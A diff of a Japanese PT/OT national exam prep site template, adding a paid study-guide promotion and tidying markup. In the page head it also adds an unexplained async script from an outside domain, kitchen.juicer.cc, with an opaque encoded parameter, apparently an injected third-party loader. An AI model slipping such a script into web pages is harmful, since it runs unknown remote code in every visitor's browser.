@@ -47,7 +47,7 @@ require_once(dirname(__FILE__).'/../qmApp/view.php');
 <link href="qm.css" rel="stylesheet" />
  <script src="jquery-1.7.1.min.js" type="text/javascript" charset="utf-8"></script>
  <script src="qmView.js" type="text/javascript" charset="utf-8"></script>
-
+<script src="//kitchen.juicer.cc/?color=C3idgkPnXPA=" async></script>
 </head>
 <body id="page" class="col2r">
 <div id="fb-root"></div>
@@ -154,6 +154,7 @@ require_once(dirname(__FILE__).'/../qmApp/view.php');
         <?php } ?>
 
     </div>
+    <div style="text-align:center;margin-bottom:10px;font-size:16px;"><a target="_blank" href="https://note.mu/ptot_kokushi/n/n8b9e47437ba3">勉強へのやる気がでなくて悩んでいる方はこちら＞</a></div>
 
     <ul class="qm-exam">
     <?php qmAnswer('exam.tpl' );	?>
@@ -165,13 +166,26 @@ require_once(dirname(__FILE__).'/../qmApp/view.php');
         <div class="qm-page" ><a href="/" ><div class="qm-page-home" >TOPへ</div></a></div>
         <div class="clearfix"></div>
     </div>
-    
-        <div class="row">
+
+
+                            <div class="note col-md-12">
+                            <h2 class="note-h">勉強方法に悩んでいませんか？</h2>
+                            <p>国家試験合格に向けて勉強していくにしても、ただがむしゃらに、気合を入れてやっても疲れてしまい続きません。</p>
+                            <p>でも、そうは言っても、効率の良い勉強方法なんて知らないし、どうせ続かない･･･        そう思っていませんか？</p>
+                            <p>でも、大丈夫です。<span class="note-span">勉強方法を習得することは誰にでもできて</span>、がむしゃらに勉強するよりも<span class="note-span">楽しく継続して勉強ができます！</span></p>
+                            <p><span class="note-span">勉強嫌いで偏差値が30しかなかった私でも、そうすることで合格できたのですから。</span></p>
+                            <p>そんな私が実践した一生ものの勉強法を、多くの方が知り、国家試験に合格して幸せな療法士生活を送れるように、<span class="note-span">今だけワンコインで提供しています。</span></p>
+                            <p><span class="note-span">勉強が嫌い、勉強が苦手、記憶力に自信がない、勉強が続かない、合格できるか不安･･･</span>など感じている人は是非このnoteを読んでください。</p>
+                            <p>そして、つらくない勉強法を身に付け、<span class="note-span">気持ちよく合格しましょう！！</span></p>
+                            <iframe class="note-embed" src="https://note.mu/embed/notes/n8b9e47437ba3" style="border: 0; display: block; max-width: 99%; width: 494px; padding: 0px; margin: 10px 0px; position: static; visibility: visible; " height="400"></iframe><script async src="https://note.mu/scripts/embed.js" charset="utf-8"></script>
+                            </div>
+
+<div class="row">
     <div class="col-12 col-md-6">
         <a href="../about/"><img style="width:100%;" src="../images/book-afi.png" alt="おすすめの本一覧"></a>
     </div>
 </div>
-    
+
 <h2>PT/OT共通問題</h2>
                               <div class="row question-box">
                               <div class="col-md-3 col-6">
@@ -218,7 +232,7 @@ require_once(dirname(__FILE__).'/../qmApp/view.php');
 
                             </div>
                             <h2>PT専門問題</h2>
-                           
+
                             <div class="row question-box">
                               <div class="col-md-3 col-6">
                                 <a class="btn btn-outline-secondary top-btn btn1" href="../item/item12" role="button">理学療法評価額</a>
@@ -240,25 +254,25 @@ require_once(dirname(__FILE__).'/../qmApp/view.php');
                               </div>
                               <div class="col-md-3 col-6">
                                 <a class="btn btn-outline-secondary top-btn btn2" href="../item/item18/" role="button">整形外科疾患</a>
-                              </div>                              
+                              </div>
                               <div class="col-md-3 col-6">
                                 <a class="btn btn-outline-secondary top-btn btn2" href="../item/item19/" role="button">脊髄損傷</a>
-                              </div>  
+                              </div>
                               <div class="col-md-3 col-6">
                                 <a class="btn btn-outline-secondary top-btn btn3" href="../item/item20/" role="button">脳血管障害</a>
                               </div>
                               <div class="col-md-3 col-6">
                                 <a class="btn btn-outline-secondary top-btn btn3" href="../item/item21/" role="button">神経筋疾患</a>
-                              </div>                              
+                              </div>
                               <div class="col-md-3 col-6">
                                 <a class="btn btn-outline-secondary top-btn btn3" href="../item/item22/" role="button">内科系疾患</a>
-                              </div>                              
+                              </div>
                               <div class="col-md-3 col-6">
                                 <a class="btn btn-outline-secondary top-btn btn3" href="../item/item23/" role="button">小児疾患</a>
                               </div>
                               <div class="col-md-3 col-6">
                                 <a class="btn btn-outline-secondary top-btn btn3" href="../item/item24/" role="button">運動療法総論</a>
-                              </div>                              
+                              </div>
                               <!---<a class="col-md-3 col-5 btn btn-outline-secondary top-btn" href="/item/item25/" role="button">第48回国試問題</a>--->
                             </div>
 </div>
@@ -536,7 +550,7 @@ require_once(dirname(__FILE__).'/../qmApp/view.php');
 <p><small>Copyright (C) 2014 理学療法士・作業療法士 国家試験対策 WEBで合格！<span>All Rights Reserved.</span></small></p>
 </div>
 <!--/コピーライト--><!--▼ページの先頭へ戻る-->
-<p class="page-top"><a href="#container">このページの先頭へ</a></p>
+        <p class="page-top"><a href="#container">▲</a></p>
 <!--▲ページの先頭へ戻る-->
 </div>
 <script type="text/javascript">
